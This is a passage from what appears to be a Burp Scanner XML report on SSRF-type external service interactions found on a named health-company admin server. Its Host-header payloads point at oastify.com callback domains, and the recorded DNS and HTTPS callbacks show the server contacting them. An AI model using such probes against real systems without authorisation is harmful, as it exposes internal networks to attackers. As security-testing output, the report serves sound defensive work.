    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>7owmu8fna4hi22bf7m3fseshj8p2d04oxnld83ws.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdvd211OGZuYTRoaTIyYmY3bTNmc2VzaGo4cDJkMDRveG5sZDgzd3Mub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:56:50.293 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdvd211OGZuYTRoaTIyYmY3bTNmc2VzaGo4cDJkMDRveG5sZDgzd3Mub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncWpnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3073421093677889536</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/buttons.html5.min.js]]></path>
    <location><![CDATA[/js/datatables/buttons.html5.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>mxn13no2jjqxbhkug1cu1t1wsnyhmeh2a1yrlh96.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG14bjEzbm8yampxeGJoa3VnMWN1MXQxd3NueWhtZWgyYTF5cmxoOTYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:52:59.434 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>mxn13no2jjqxbhkug1cu1t1wsnyhmeh2a1yrlh96.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6286416189865230336</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/buttons.html5.min.js]]></path>
    <location><![CDATA[/js/datatables/buttons.html5.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>mxn13no2jjqxbhkug1cu1t1wsnyhmeh2a1yrlh96.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG14bjEzbm8yampxeGJoa3VnMWN1MXQxd3NueWhtZWgyYTF5cmxoOTYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:53:00.375 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IG14bjEzbm8yampxeGJoa3VnMWN1MXQxd3NueWhtZWgyYTF5cmxoOTYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncG5nbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>131481502739911680</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.bootstrap4.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>a3ep9buqp7wlh5qimpii7h7kyb45s1wppode04ot.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGEzZXA5YnVxcDd3bGg1cWltcGlpN2g3a3liNDVzMXdwcG9kZTA0b3Qub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.84.197</originIp>
      <time>2024-Dec-15 00:51:21.283 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>a3ep9buqp7wlh5qimpii7h7kyb45s1wppode04ot.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1864119103286695936</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.bootstrap4.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>a3ep9buqp7wlh5qimpii7h7kyb45s1wppode04ot.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGEzZXA5YnVxcDd3bGg1cWltcGlpN2g3a3liNDVzMXdwcG9kZTA0b3Qub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:51:21.845 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGEzZXA5YnVxcDd3bGg1cWltcGlpN2g3a3liNDVzMXdwcG9kZTA0b3Qub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nb3dnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>3110111744883848192</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.colReorder.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.colReorder.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>ld20jm41zi6wrg0tw0sthshv8meg2d11u0iq5gt5.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGxkMjBqbTQxemk2d3JnMHR3MHN0aHNodjhtZWcyZDExdTBpcTVndDUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:54:06.816 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>ld20jm41zi6wrg0tw0sthshv8meg2d11u0iq5gt5.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8179712159878033408</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.colReorder.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.colReorder.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>ld20jm41zi6wrg0tw0sthshv8meg2d11u0iq5gt5.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGxkMjBqbTQxemk2d3JnMHR3MHN0aHNodjhtZWcyZDExdTBpcTVndDUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:54:07.756 UTC</time>
      <requestresponse>
